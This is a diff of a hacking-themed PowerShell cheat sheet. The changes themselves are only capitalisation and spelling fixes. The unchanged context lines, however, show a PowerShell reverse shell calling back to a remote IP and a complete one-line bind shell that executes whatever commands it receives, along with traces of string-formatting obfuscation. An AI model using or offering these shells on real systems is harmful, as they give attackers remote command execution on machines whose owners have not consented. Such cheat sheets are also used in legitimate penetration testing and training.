@@ -1,6 +1,6 @@
-# Useful Powershell
+# Useful PowerShell
 
-This is a condensed and *Hacking themed* resource for powershell. Powershell is a massive and my humble opinion a *weird* object-oriented programming language.  Windows and Powershell are not case-sensitive, but a *stardard* readability is to use upper-case first letter - I suggest not unless you need to present your work(use a script to change it to *standard*). Every command has a cmdlet and combinations of `verb-noun` to construct command that would be too numerous to list. So to define the theme of this document is oneliners catergorised by use(*just in case at some point they maybe some exceptions like two oneliners that need to be seperate executions* **THESE WILL HAVE A `# TASKNAME Command # THEN Command`**. I am in the process of making this better for my own use:
+This is a condensed and *Hacking themed* resource for PowerShell. PowerShell is a massive and my humble opinion a *weird* object-oriented programming language.  Windows and PowerShell are not case-sensitive, but a *standard* readability is to use upper-case first letter - I suggest not unless you need to present your work(use a script to change it to *standard*). Every command has a `cmdlet` and combinations of `verb-noun` to construct command that would be too numerous to list. So to define the theme of this document is oneliners catergorised by use(*just in case at some point they maybe some exceptions like two oneliners that need to be seperate executions* **THESE WILL HAVE A `# TASKNAME Command # THEN Command`**. I am in the process of making this better for my own use:
 1. Adding aliases that I might want to use instead of full command
 2. Making the comments defining explaining a better layout
 
@@ -301,7 +301,7 @@ ${string} = ("{9}{8}{7}{6}{5}{4}{3}{2}{1}{0}"-f'Power','shell',' Formatting',' i
 echo $string 
 ```
 
-## Powershell Reverse Shell
+## PowerShell Reverse Shell
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
 $stream = $client.GetStream();
@@ -323,7 +323,7 @@ Enclose with:
 ```
 For the one liner
 
-## Powershell Bind Shell
+## PowerShell Bind Shell
 Remember to change local addresss accordingly, some localhosts won't be `0.0.0.0`
 ```powershell
 $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
@@ -351,11 +351,10 @@ invoke-command -computername $computername -ScriptBlock { hostname }  -Credentia
 
 ## Type accelerators
 
-"Type accelerators are aliases for .NET framework classes allowing access to specific .NET framework classes without having to type the full class name explicitly. For example:
-`AliasAttribute` class from `[System.Management.Automation.AliasAttribute]` to `[Alias]`." 
-[docs.microsoft.com about_type_accelerators in powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1)
+[docs.microsoft.com about_type_accelerators in powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1): *"Type accelerators are aliases for .NET framework classes allowing access to specific .NET framework classes without having to type the full class name explicitly. For example:
+`AliasAttribute` class from `[System.Management.Automation.AliasAttribute]` to `[Alias]`."*
 
-Create new type accelators [idera adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell) 
+Create new type accelerators [idera adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell) 
 
 
 ## References
